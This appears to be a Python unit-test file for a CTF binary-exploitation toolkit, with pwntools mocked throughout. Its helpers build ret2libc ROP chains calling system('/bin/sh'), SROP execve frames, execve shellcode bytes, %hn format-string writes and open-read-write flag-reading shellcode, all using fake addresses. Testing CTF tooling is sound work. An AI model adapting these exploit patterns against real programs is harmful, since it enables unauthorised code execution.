"""Mocked pwntools script tests for ctf-pwn toolkit.

Validates mocked generators from ctf-pwn/scripts/*:
ret2libc two-stage, SROP SigreturnFrame, shellcraft asm avoid,
fmtstr_payload write_size, and seccomp ORW strategies.
No real network or binary — all pwntools primitives mocked via unittest.mock.
"""

from __future__ import annotations

import struct
import unittest
from unittest.mock import MagicMock, call, patch

try:
    import pytest  # type: ignore[import]
except ImportError:  # pragma: no cover
    pytest = None  # type: ignore[assignment]

# ---------------------------------------------------------------------------
# Helpers — pure-Python + mocked pwntools, mirror ctf-pwn/scripts style
# ---------------------------------------------------------------------------

OFFSET = 40
SYS_rt_sigreturn = 15  # amd64
SYS_execve = 59


def _p64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _fake_flat(mapping_or_bytes, filler: bytes = b"A", **kwargs) -> bytes:
    """Deterministic flat: dict {offset: [values]} -> padded bytes."""
    if isinstance(mapping_or_bytes, dict):
        # only OFFSET key expected in our generators
        out = b""
        for off, vals in mapping_or_bytes.items():
            # pad to offset
            if len(out) < off:
                out += filler * (off - len(out))
            # vals is list of ints/bytes
            for v in vals if isinstance(vals, list) else [vals]:
                if isinstance(v, int):
                    out += _p64(v)
                elif isinstance(v, bytes):
                    out += v
                else:
                    # ROP chain bytes
                    out += bytes(v)
        return out
    if isinstance(mapping_or_bytes, bytes):
        return mapping_or_bytes
    return b"".join(_p64(x) if isinstance(x, int) else x for x in mapping_or_bytes)


class _FakeSigreturnFrame:
    """Minimal SigreturnFrame stub: stores regs, bytes() non-empty."""

    def __init__(self):
        self.rax = 0
        self.rdi = 0
        self.rsi = 0
        self.rdx = 0
        self.rip = 0
        self.rsp = 0
        self.rbx = 0
        self.rcx = 0

    def __bytes__(self) -> bytes:
        # deterministic 248 bytes like real SigreturnFrame on amd64
        hdr = struct.pack("<QQQ", self.rax, self.rdi, self.rsi)
        hdr += struct.pack("<QQQ", self.rdx, self.rip, self.rsp)
        hdr += struct.pack("<QQ", self.rbx, self.rcx)
        return hdr + b"\x00" * (248 - len(hdr))


def _fake_asm(code: str | bytes, avoid: bytes | None = None, **kwargs) -> bytes:
    """Fake asm: returns deterministic bytes without avoid chars."""
    # base shellcode without bad chars
    base = b"\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    # ensure avoid chars not in output: replace them
    if avoid:
        filtered = bytes(b for b in base if b not in avoid)
        # if filtering removed bytes, pad with alternate encodings
        while len(filtered) < len(base):
            filtered += b"\x90"
            filtered = bytes(b for b in filtered if b not in avoid)
        return filtered[: len(base)]
    return base


def _fake_fmtstr_payload(offset: int, writes: dict[int, int], write_size: str = "short", **kwargs) -> bytes:
    """Fake fmtstr_payload: returns format string bytes deterministically."""
    # write_size controls splitting: short uses %hn, byte uses %hhn, int uses %n
    size_token = {"short": b"hn", "byte": b"hhn", "int": b"n"}.get(write_size, b"hn")
    parts = []
    for addr, val in writes.items():
        parts.append(f"%{val}c%{offset}$".encode() + size_token + _p64(addr))
    return b".".join(parts) if parts else b"%6$p."


def _ret2system_payloads(libc_base: int, flat_fn=_fake_flat, rop_factory=None):
    """Yield ret2system payload variants (classic, no-rdi, ROP)."""
    POP_RDI = 0x40123B
    RET = 0x40101A
    system = libc_base + 0x50D70  # fake offset
    binsh = libc_base + 0x1D8698
    # classic pop rdi; ret -> system
    yield flat_fn({OFFSET: [RET, POP_RDI, binsh, system]})
    # variant without extra ret
    yield flat_fn({OFFSET: [POP_RDI, binsh, system]})
    # ROP chain variant
    if rop_factory is not None:
        rop = rop_factory()
        rop.raw(RET)
        rop.call(system, [binsh])
        yield flat_fn({OFFSET: rop.chain()})
    else:
        # fake ROP chain bytes
        yield flat_fn({OFFSET: [RET, POP_RDI, binsh, system, RET]})


def _srop_execve_frames(binsh_addr: int, frame_cls=_FakeSigreturnFrame, variants=None):
    """Yield SigreturnFrame variants for execve('/bin/sh',0,0)."""
    variants = variants or ["classic", "with_rsp", "alt_regs"]
    for name in variants:
        frame = frame_cls()
        frame.rax = SYS_rt_sigreturn
        frame.rip = 0x4010A0
        frame.rdi = binsh_addr
        frame.rsi = 0
        frame.rdx = 0
        if name == "with_rsp":
            frame.rsp = binsh_addr + 0x100
        elif name == "alt_regs":
            frame.rbx = 0
            frame.rcx = 0
        yield name, bytes(frame)


def _orw_strategies(asm_fn=_fake_asm, fake_shellcraft=None):
    """Yield (name, shellcode) ORW strategies."""

    def sc_open(path: str) -> str:
        return f"open:{path}"

    def sc_read(fd, buf, size) -> str:
        return f"read:{fd}:{buf}:{size}"

    def sc_write(fd, buf, size) -> str:
        return f"write:{fd}:{buf}:{size}"

    # plain ORW
    sc = sc_open("/flag.txt") + sc_read("rax", 0x404800, 0x100) + sc_write(1, 0x404800, 0x100)
    yield ("plain_orw", asm_fn(sc))
    # amd64 explicit
    sc2 = sc_open("/flag.txt") + sc_read("rax", "rsp", 0x80) + sc_write(1, "rsp", 0x80)
    yield ("amd64_explicit", asm_fn(sc2))
    # fd reuse
    sc3 = sc_open("/flag.txt") + "mov r4, rax\n" + sc_read("r4", 0x404800, 0x100) + sc_write(1, 0x404800, 0x100)
    yield ("fd_reuse_r4", asm_fn(sc3))
    # manual syscall
    sc4 = "mov rax, 2; lea rdi, [rip+flag]; syscall; flag: .asciz \"/flag.txt\""
    yield ("manual_syscall", asm_fn(sc4))
    # mmap + ORW
    sc5 = "mmap" + sc_open("/flag.txt") + sc_read("rax", 0x404800, 0x100) + sc_write(1, 0x404800, 0x100)
    yield ("mmap_orw", asm_fn(sc5))


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


class TestPwnScripts(unittest.TestCase):
    """Mocked tests for pwntools script generators — no network."""

    def test_ret2libc_generator_yields(self) -> None:
        """ret2libc_two_stage ret2system_payloads yields flat payload."""
        mock_flat = MagicMock(side_effect=_fake_flat)
        mock_rop = MagicMock()
        mock_rop_instance = MagicMock()
        mock_rop_instance.chain.return_value = b"\x90" * 32
        mock_rop.return_value = mock_rop_instance

        with patch.dict("sys.modules", {"pwn": MagicMock(flat=mock_flat, ROP=mock_rop)}):
            libc_base = 0x7FFFF7C00000
            payloads = list(_ret2system_payloads(libc_base, flat_fn=mock_flat, rop_factory=mock_rop))

        self.assertGreaterEqual(len(payloads), 2, "should yield at least 2 variants")
        for p in payloads:
            self.assertIsInstance(p, bytes)
            self.assertGreaterEqual(len(p), OFFSET)
            # flat payload must start with filler/padding at OFFSET
            self.assertTrue(p.startswith(b"A" * OFFSET) or len(p) >= OFFSET)
        # verify flat was called with dict containing OFFSET
        self.assertTrue(mock_flat.called)
        first_call_arg = mock_flat.call_args_list[0].args[0]
        self.assertIsInstance(first_call_arg, dict)
        self.assertIn(OFFSET, first_call_arg)
        # ROP variant exercised
        mock_rop_instance.raw.assert_called()
        mock_rop_instance.call.assert_called()

    def test_srop_frame_uses_sigreturn(self) -> None:
        """SigreturnFrame rax = SYS_rt_sigreturn."""
        binsh = 0x404000
        frames = list(_srop_execve_frames(binsh, frame_cls=_FakeSigreturnFrame))
        self.assertGreaterEqual(len(frames), 3)
        for name, fb in frames:
            self.assertIsInstance(name, str)
            self.assertIsInstance(fb, bytes)
            self.assertGreater(len(fb), 0)

        # direct frame assertion
        frame = _FakeSigreturnFrame()
        # mock constants.SYS_rt_sigreturn
        mock_constants = MagicMock(SYS_rt_sigreturn=SYS_rt_sigreturn)
        with patch.dict("sys.modules", {"pwn": MagicMock(SigreturnFrame=_FakeSigreturnFrame, constants=mock_constants)}):
            f = _FakeSigreturnFrame()
            f.rax = mock_constants.SYS_rt_sigreturn
            f.rip = 0x4010A0
            self.assertEqual(f.rax, SYS_rt_sigreturn)
            self.assertEqual(f.rax, 15)
            self.assertEqual(bytes(f)[:8], _p64(SYS_rt_sigreturn))

        # also verify _srop_execve_frames sets rax correctly via patched frame
        captured = {}

        class CapturingFrame(_FakeSigreturnFrame):
            def __init__(self):
                super().__init__()
                captured["instance"] = self

        list(_srop_execve_frames(binsh, frame_cls=CapturingFrame, variants=["classic"]))
        self.assertEqual(captured["instance"].rax, SYS_rt_sigreturn)
        self.assertEqual(captured["instance"].rdi, binsh)

    def test_shellcraft_avoid(self) -> None:
        """asm(shellcraft.sh(), avoid=b'\\x00\\n') no null."""
        mock_shellcraft = MagicMock()
        mock_shellcraft.sh.return_value = "mov rax, 59; syscall; /bin/sh"
        mock_asm = MagicMock(side_effect=_fake_asm)

        with patch.dict("sys.modules", {"pwn": MagicMock(shellcraft=mock_shellcraft, asm=mock_asm)}):
            sc = mock_asm(mock_shellcraft.sh(), avoid=b"\x00\n")
            # also test direct helper
            sc2 = _fake_asm(mock_shellcraft.sh.return_value, avoid=b"\x00\n")

        self.assertIsInstance(sc, bytes)
        self.assertNotIn(b"\x00", sc, "shellcode must avoid null bytes")
        self.assertNotIn(b"\n", sc, "shellcode must avoid newline")
        mock_asm.assert_called()
        # verify avoid kwarg passed
        _, kwargs = mock_asm.call_args
        self.assertIn("avoid", kwargs)
        self.assertEqual(kwargs["avoid"], b"\x00\n")

        # real helper also avoids
        self.assertNotIn(b"\x00", sc2)
        self.assertNotIn(b"\n", sc2)
        self.assertGreater(len(sc2), 0)

    def test_fmtstr_write_size(self) -> None:
        """fmtstr_payload(write_size='short') works."""
        mock_fmt = MagicMock(side_effect=_fake_fmtstr_payload)

        with patch.dict("sys.modules", {"pwn": MagicMock(fmtstr_payload=mock_fmt)}):
            writes = {0x404018: 0x401234}
            payload = mock_fmt(6, writes, write_size="short")
            payload_byte = mock_fmt(6, writes, write_size="byte")
            payload_int = mock_fmt(6, writes, write_size="int")

        self.assertIsInstance(payload, bytes)
        self.assertGreater(len(payload), 0)
        self.assertIn(b"hn", payload, "short should use %hn")
        self.assertIn(b"hhn", payload_byte, "byte should use %hhn")
        # short vs byte should differ
        self.assertNotEqual(payload, payload_byte)
        # verify calls had write_size kwarg
        calls = mock_fmt.call_args_list
        self.assertEqual(calls[0].kwargs.get("write_size"), "short")
        self.assertEqual(calls[1].kwargs.get("write_size"), "byte")
        self.assertEqual(calls[2].kwargs.get("write_size"), "int")

        # also test helper directly
        direct = _fake_fmtstr_payload(6, {0x404018: 0x401234}, write_size="short")
        self.assertIn(b"hn", direct)
        self.assertIn(_p64(0x404018), direct)

    def test_orw_generator_yields(self) -> None:
        """seccomp orw_payloads yields chain."""
        mock_asm = MagicMock(side_effect=_fake_asm)
        mock_shellcraft = MagicMock()
        mock_shellcraft.open.return_value = "open_code"
        mock_shellcraft.read.return_value = "read_code"
        mock_shellcraft.write.return_value = "write_code"
        mock_shellcraft.mmap.return_value = "mmap_code"

        with patch.dict(
            "sys.modules",
            {"pwn": MagicMock(asm=mock_asm, shellcraft=mock_shellcraft)},
        ):
            strategies = list(_orw_strategies(asm_fn=mock_asm))

        self.assertGreaterEqual(len(strategies), 3, "should yield at least 3 ORW strategies")
        names = [n for n, _ in strategies]
        self.assertEqual(len(names), len(set(names)), "strategy names must be unique")
        for name, sc in strategies:
            self.assertIsInstance(name, str)
            self.assertIsInstance(sc, bytes)
            self.assertGreater(len(sc), 0)

        # verify asm called once per strategy
        self.assertEqual(mock_asm.call_count, len(strategies))

        # names should include expected variants
        self.assertIn("plain_orw", names)
        self.assertIn("mmap_orw", names)

    def test_build_payload_flat_deterministic(self) -> None:
        """build_payload flat uses OFFSET and is deterministic."""
        mock_flat = MagicMock(side_effect=_fake_flat)

        def build_payload(shellcode: bytes) -> bytes:
            return mock_flat({OFFSET: shellcode})

        sc = b"\x90" * 16 + b"\x31\xc0\x0f\x05"
        p1 = build_payload(sc)
        p2 = build_payload(sc)
        self.assertEqual(p1, p2, "flat payload must be deterministic")
        self.assertIsInstance(p1, bytes)
        self.assertTrue(p1.startswith(b"A" * OFFSET))
        self.assertIn(sc, p1)
        mock_flat.assert_called()
        self.assertEqual(mock_flat.call_args[0][0][OFFSET], sc)
